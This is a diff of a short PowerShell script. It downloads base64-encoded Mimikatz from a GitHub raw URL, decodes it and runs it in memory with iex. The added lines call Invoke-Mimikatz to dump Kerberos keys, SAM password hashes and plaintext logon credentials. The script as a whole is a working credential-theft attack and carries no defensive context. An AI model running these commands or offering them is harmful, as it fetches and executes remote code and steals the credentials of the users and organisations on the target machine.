@@ -1,3 +1,9 @@
 $mimi = (Invoke-WebRequest https://raw.githubusercontent.com/lemoman1/mimikatz/main/b64.txt).Content
 $mimikatz = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($mimi))
 iex $mimikatz
+
+
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+Invoke-Mimikatz -Command '"lsadump::sam"'
+Invoke-Mimikatz -Command '"sekurlsa::logonPasswords full"'
+Invoke-Mimikatz -Command '"privilege::debug"'
